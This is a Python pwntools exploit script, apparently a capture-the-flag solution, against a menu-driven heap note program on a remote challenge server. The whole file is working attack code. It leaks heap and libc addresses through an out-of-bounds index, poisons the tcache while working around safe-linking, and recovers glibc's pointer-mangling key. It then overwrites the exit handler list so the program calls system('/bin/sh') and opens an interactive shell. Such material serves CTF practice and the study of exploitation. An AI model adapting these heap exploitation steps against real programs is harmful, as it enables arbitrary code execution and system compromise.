from pwn import *

def create(size, content):
    p.sendlineafter(b"[E]xit\n", b"C")
    p.sendlineafter(b"size?\n", str(size).encode())
    p.sendlineafter(b"content?\n", content)

def output(idx, check=True):
    p.sendlineafter(b"[E]xit\n", b"O")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())
    if check:
        return p.recvuntil(b"=======", drop=True)
    else:
        return p.recvuntil(b"1. [C]reate", drop=True)

def update(idx, content):
    p.sendlineafter(b"[E]xit\n", b"U")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b"[E]xit\n", b"D")
    p.sendlineafter(b"Which text? (0-9)\n", str(idx).encode())

context.terminal = ["tmux", "neww"]
context.binary = libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = remote("win.the.seetf.sg", 2001)
# p = process("./chall")

create(0x20, b"A")
delete(0)

heap_leak = (u64(output(1000)[:8]) << 12) + 0x350
log.info(f"heap leak @ {hex(heap_leak)}")

create(0x500, b"B")
create(0x500, b"C")
delete(0)

libc_leak = u64(output(1000, False)[:8])
libc.address = libc_leak - 2202848
xor_key = libc.address - 10384 - 0x30
exit_funcs = libc.address + 2207488 +0x150

log.info(f"libc leak @ {hex(libc_leak)}")
log.info(f"libc base @ {hex(libc.address)}")

delete(0)
delete(1)

create(0x50, b"A")
create(0x50, b"B")
create(0x50, b"C")
delete(2)
delete(1)
delete(0)
create(0x50, b"C")
#p64(e.got.free ^ ((heap_leak+0x2a0) >> 12)))
update(123, p64(xor_key ^ (heap_leak >> 12)))
create(0x50, b"D")
create(0x50, b"")

xor_key = output(2)
p.recvuntil(b"message:\n")
xor_key = u64(p.recvline()[31:39])

delete(0)
delete(1)

create(0x60, b"A")
create(0x60, b"B")
create(0x60, b"C")
delete(3)
delete(1)
delete(0)
create(0x60, b"C")
#p64(e.got.free ^ ((heap_leak+0x2a0) >> 12)))
# update(123, b"A"*8)
"""
0x7f06e8239f00 <initial>:       0x0000000000000a41      0x000000000000000c
0x7f06e8239f10 <initial+16>:    0x0000000000000004      0x4d206e7c920b68a1
"""
update(123, p64(exit_funcs ^ ((heap_leak+0x160) >> 12)))
create(0x60, b"A")
create(0x60, b"\x00"*8 + p64(0xc) + p64(4) + p64(rol(libc.sym.system ^ xor_key, 0x11, 64)) + p64(next(libc.search(b'/bin/sh'))))

p.sendline(b"E")
# gdb.attach(p)

p.interactive()
